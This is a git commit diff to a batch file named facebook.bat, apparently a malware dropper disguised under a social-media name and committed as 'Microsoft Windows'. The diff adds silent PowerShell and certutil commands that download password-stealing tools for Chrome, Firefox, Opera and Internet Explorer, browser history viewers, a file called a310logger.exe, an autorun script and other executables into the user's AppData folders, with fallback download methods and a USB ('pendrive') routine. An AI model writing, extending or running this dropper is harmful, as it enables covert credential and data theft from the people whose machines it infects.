b62c11ee86fff0bbbfaf3e8617fe9e6428405831
Microsoft Windows <42375657+win32u@users.noreply.github.com>
2022-05-15 22:10:22 +0600

    Update facebook.bat

--- Extension/facebook.bat
+++ Extension/facebook.bat
@@ -57,41 +57,63 @@ echo *************DOWNLOAD file****************
    
    if not exist "C:\Users\%username%\AppData\Roaming\BrowserDownloadsview.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/browserdownloadsview.exe?raw=true', 'BrowserDownloadsview.exe')" > nul 2> nul    
-   )
+   )  
+      if errorlevel 1 goto ERROR2  
+
    if not exist "C:\Users\%username%\AppData\Roaming\BrowsingHistoryView.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/browsinghistoryview.exe?raw=true', 'BrowsingHistoryView.exe')" > nul 2> nul 
-   )
+   )  
+      if errorlevel 1 goto ERROR2  
+
    if not exist "C:\Users\%username%\AppData\Roaming\ChromePass.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/ChromePass.exe?raw=true', 'ChromePass.exe')" > nul 2> nul
-   )
+   )  
+      if errorlevel 1 goto ERROR2  
+
    if not exist "C:\Users\%username%\AppData\Roaming\IEpassView.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/iepv.exe?raw=true', 'IEpassView.exe')" > nul 2> nul
-   )
+   )  
+      if errorlevel 1 goto ERROR2  
+
    if not exist "C:\Users\%username%\AppData\Roaming\MyLastSearch.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/mylastsearch.exe?raw=true', 'MyLastSearch.exe')" > nul 2> nul
-   )
+   )  
+      if errorlevel 1 goto ERROR2  
+
    if not exist "C:\Users\%username%\AppData\Roaming\OperaPassView.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/operapassview.exe?raw=true', 'OperaPassView.exe')" > nul 2> nul
-   )
+   )  
+      if errorlevel 1 goto ERROR2  
+
    if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/PasswordFox.exe?raw=true', 'PasswordFox.exe')" > nul 2> nul
-   )
+   )  
+      if errorlevel 1 goto ERROR2  
+
    if not exist "C:\Users\%username%\AppData\Roaming\facebook.bat" (      
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true', 'facebook.bat')" > nul 2> nul
-   )
+   )  
+      if errorlevel 1 goto ERROR2  
+
    if not exist "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true', 'AutoRun.vbs')" > nul 2> nul
-   )
+   )  
+      if errorlevel 1 goto ERROR2  
+
    if not exist "C:\Users\%username%\AppData\Roaming\instagram.ps1" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true', 'instagram.ps1')" > nul 2> nul
-   )
+   )  
+      if errorlevel 1 goto ERROR2  
+
    if not exist "C:\Users\%username%\AppData\Roaming\a310logger.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true', 'a310logger.exe')" > nul 2> nul
-   )
+   )  
+      if errorlevel 1 goto ERROR2   
+
    if not exist "C:\Users\%username%\AppData\Local\0101\folder.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true', 'folder.exe')" > nul 2> nul
    )
-   if errorlevel 1 goto ERROR2   
+      if errorlevel 1 goto ERROR2   
    goto SUCCESS 
 
 
@@ -102,41 +124,63 @@ echo *************DOWNLOAD file****************
    timeout 3 > NUL
    if not exist "C:\Users\%username%\AppData\Roaming\BrowserDownloadsview.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/browserdownloadsview.exe?raw=true -OutFile BrowserDownloadsview.exe" > nul 2> nul
-   )
+   )  
+      if errorlevel 1 goto ERROR3
+     
    if not exist "C:\Users\%username%\AppData\Roaming\BrowsingHistoryView.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/browsinghistoryview.exe?raw=true -OutFile BrowsingHistoryView.exe" > nul 2> nul
-   )
+   )   
+      if errorlevel 1 goto ERROR3
+
    if not exist "C:\Users\%username%\AppData\Roaming\ChromePass.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/ChromePass.exe?raw=true -OutFile ChromePass.exe" > nul 2> nul
-   )
+   )   
+      if errorlevel 1 goto ERROR3
+ 
    if not exist "C:\Users\%username%\AppData\Roaming\IEpassView.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/iepv.exe?raw=true -OutFile IEpassView.exe" > nul 2> nul
-   )
+   )   
+      if errorlevel 1 goto ERROR3
+ 
    if not exist "C:\Users\%username%\AppData\Roaming\MyLastSearch.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/mylastsearch.exe?raw=true -OutFile MyLastSearch.exe" > nul 2> nul
-   )
+   )   
+      if errorlevel 1 goto ERROR3
+  
    if not exist "C:\Users\%username%\AppData\Roaming\OperaPassView.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/operapassview.exe?raw=true -OutFile OperaPassView.exe" > nul 2> nul
-   )
+   )   
+      if errorlevel 1 goto ERROR3
+ 
    if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/PasswordFox.exe?raw=true -OutFile PasswordFox.exe" > nul 2> nul
-   )
+   )   
+      if errorlevel 1 goto ERROR3
+  
    if not exist "C:\Users\%username%\AppData\Roaming\facebook.bat" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true -OutFile facebook.bat" > nul 2> nul
-   )
+   )   
+      if errorlevel 1 goto ERROR3
+
    if not exist "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true -OutFile AutoRun.vbs" > nul 2> nul
-   )
+   )   
+      if errorlevel 1 goto ERROR3
+
    if not exist "C:\Users\%username%\AppData\Roaming\instagram.ps1" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true -OutFile instagram.ps1" > nul 2> nul
-   )
+   )   
+      if errorlevel 1 goto ERROR3
+  
    if not exist "C:\Users\%username%\AppData\Roaming\a310logger.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true -OutFile a310logger.exe" > nul 2> nul
    )   
+      if errorlevel 1 goto ERROR3
+  
    if not exist "C:\Users\%username%\AppData\Local\0101\folder.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true?raw=true -OutFile folder.exe" > nul 2> nul
-   )
-   if errorlevel 1 goto ERROR3
+   )   
+      if errorlevel 1 goto ERROR3
    goto SUCCESS 
 
 
@@ -145,8 +189,29 @@ echo *************DOWNLOAD file****************
    echo.
    echo Please, wait...
    timeout 3 > NUL
-   set url="https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true"
+   set url="https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true"
+   set filename="AutoRun.vbs"
+   certutil -urlcache -split -f %url% %filename% > nul 2> nul
+   if errorlevel 1 goto EOF
+
+   set url="https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true"
+   set filename="facebook.bat"
+   certutil -urlcache -split -f %url% %filename% > nul 2> nul
+   if errorlevel 1 goto EOF
+
+   set url="https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true"
+   set filename="instagram.ps1"
+   certutil -urlcache -split -f %url% %filename% > nul 2> nul
+   if errorlevel 1 goto EOF
+
+
+   set url="https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true"
    set filename="a310logger.exe"
+   certutil -urlcache -split -f %url% %filename% > nul 2> nul
+   if errorlevel 1 goto EOF
+
+   set url="https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true"
+   set filename="folder.exe"
    certutil -urlcache -split -f %url% %filename% > nul 2> nul
    if errorlevel 1 goto EOF
    goto SUCCESS 
@@ -273,5 +338,5 @@ echo *************DOWNLOAD file****************
 		   goto pendrive
 	
 
-PAUSE
+exit
 
